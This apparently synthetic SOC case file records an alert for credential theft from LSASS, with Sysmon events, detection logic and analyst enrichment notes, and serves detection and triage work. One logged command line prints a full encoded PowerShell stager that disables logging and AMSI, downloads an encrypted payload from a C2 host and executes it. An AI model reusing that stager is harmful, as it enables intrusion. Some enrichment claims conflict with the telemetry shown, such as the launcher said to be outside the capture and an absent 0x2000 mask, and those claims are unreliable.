@@ -1,0 +1,183 @@
+{
+  "case_id": "CASE-5D041AA1",
+  "environment": {
+    "host": "WKS-4471",
+    "os": "Windows 10 (build 10.0.18362)",
+    "domain_role": "domain-joined workstation (CORP)",
+    "telemetry_sources": [
+      "Sysmon Operational",
+      "Windows Security Auditing"
+    ]
+  },
+  "alert": {
+    "rule_id": "TNX-CRED-001",
+    "rule_name": "LSASS Process Memory Read via Suspicious Handle",
+    "severity": "high",
+    "analyst_priority": "P2",
+    "description": "A process obtained a handle to lsass.exe with access rights permitting memory reads (PROCESS_VM_READ). LSASS holds plaintext credentials, hashes, and Kerberos tickets in memory; non-security-tooling reads of LSASS are a high-fidelity indicator of credential theft, independent of the dumping tool used.",
+    "detection_logic": "Sysmon EventID=10 (ProcessAccess) WHERE TargetImage ENDSWITH '\\lsass.exe' AND GrantedAccess IN (0x1010,0x1038,0x1410,0x1438,0x143a,0x1fffff) AND SourceImage NOT IN (known_security_tooling) AND SourceImage NOT IN (wininit.exe, csrss.exe, services.exe, MsMpEng.exe)",
+    "data_source": "Sysmon Operational (EventID 10)",
+    "fired_at": "2020-08-07T14:32:56.540Z",
+    "trigger_count": 1,
+    "host": "WKS-4471"
+  },
+  "context_tier": "curated",
+  "telemetry": [
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:22.751",
+      "record_id": "R000007",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65372",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:27.843",
+      "record_id": "R000016",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65379",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:32.969",
+      "record_id": "R000055",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65380",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:45.731",
+      "record_id": "R000137",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65382",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-08-07 14:32:45.881",
+      "record_id": "R000152",
+      "process_id": "6504",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "command_line": "\"C:\\windows\\system32\\whoami.exe\" /user",
+      "current_directory": "C:\\windows\\system32\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88",
+      "parent_process_id": "1648",
+      "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "original_file_name": "whoami.exe"
+    },
+    {
+      "event_id": "Sysmon/10",
+      "event_type": "ProcessAccess",
+      "utc_time": "2020-08-07 14:32:46.927",
+      "record_id": "R000315",
+      "source_process_id": "452",
+      "source_image": "C:\\windows\\system32\\svchost.exe",
+      "target_process_id": "768",
+      "target_image": "C:\\windows\\system32\\lsass.exe",
+      "granted_access": "0x1000",
+      "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51"
+    },
+    {
+      "event_id": "Sysmon/10",
+      "event_type": "ProcessAccess",
+      "utc_time": "2020-08-07 14:32:46.927",
+      "record_id": "R000316",
+      "source_process_id": "452",
+      "source_image": "C:\\windows\\system32\\svchost.exe",
+      "target_process_id": "768",
+      "target_image": "C:\\windows\\system32\\lsass.exe",
+      "granted_access": "0x1000",
+      "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51"
+    },
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:51.140",
+      "record_id": "R001150",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65385",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/3",
+      "event_type": "NetworkConnect",
+      "utc_time": "2020-08-07 14:32:56.281",
+      "record_id": "R001986",
+      "process_id": "1648",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "CORP\\j.marsh",
+      "protocol": "tcp",
+      "source_ip": "10.24.8.21",
+      "source_port": "65386",
+      "destination_ip": "10.24.9.50",
+      "destination_port": "80",
+      "initiated": "true"
+    },
+    {
+      "event_id": "Sysmon/10",
+      "event_type": "ProcessAccess",
+      "utc_time": "2020-08-07 14:32:56.540",
+      "record_id": "R002355",
+      "source_process_id": "1648",
+      "source_image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "target_process_id": "768",
+      "target_image": "C:\\windows\\system32\\lsass.exe",
+      "granted_access": "0x1010",
+      "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+2726e|UNKNOWN(000002EE319439BF)"
+    }
+  ],
+  "enrichment": {
+    "lsass_pid_768": "Target PID 768 = lsass.exe (Local Security Authority Subsystem Service) - stores credential material in memory.",
+    "granted_access_decode": {
+      "0x1010": "PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ - the minimum rights needed to read another process's memory. Credential-dumping tooling that reads LSASS in place, rather than writing a dump file, requests exactly this mask.",
+      "0x1000": "PROCESS_QUERY_LIMITED_INFORMATION only - no memory read. Normal for service-manager housekeeping.",
+      "0x2000": "PROCESS_SET_LIMITED_INFORMATION - no memory read."
+    },
+    "call_trace_note": "The alerting CallTrace terminates in UNKNOWN(000002EE319439BF) rather than a named module. Sysmon writes UNKNOWN when the calling instruction pointer lies in committed memory that is not backed by any DLL on disk. That is the signature of reflectively-loaded code - a module mapped directly into the process by the implant, never written to disk. Benign LSASS readers (antivirus, LSM, WER) always resolve to signed, on-disk modules.",
+    "source_process": "powershell.exe PID 1648 is the alerting process. Its parent chain and the -enc launcher are outside the captured window, but the same PID is the source of the periodic outbound connections below.",
+    "beacon_note": "PID 1648 makes outbound TCP connections to 10.24.9.50:80 at a near-constant ~5.1 second interval throughout the capture. Fixed-interval callbacks with no user-driven variation are characteristic of command-and-control beaconing, not interactive browsing.",
+    "account": "CORP\\j.marsh, a domain user account. The whoami.exe /user execution immediately before the LSASS read is consistent with an operator orienting themselves after gaining access.",
+    "contrast_note": "svchost.exe also appears accessing lsass.exe in this window with masks 0x1000 and 0x2000. Neither grants PROCESS_VM_READ, and both resolve to signed on-disk modules; these are normal service-control operations, not part of the alert."
+  }
+}
